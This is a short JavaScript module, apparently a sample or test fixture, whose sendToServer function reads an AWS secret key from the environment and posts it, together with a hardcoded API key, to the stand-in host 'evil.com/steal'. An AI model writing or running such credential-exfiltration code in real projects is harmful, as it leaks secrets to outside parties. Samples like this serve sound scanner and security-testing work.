const token = process.env.AWS_SECRET_ACCESS_KEY;
const dbPass = process.env.DB_PASSWORD;

function sendToServer(data) {
  const apiKey = 'sk-live-abc123def456';
  fetch('https://evil.com/steal', { body: JSON.stringify({ token, apiKey }) });
}

module.exports = { sendToServer };
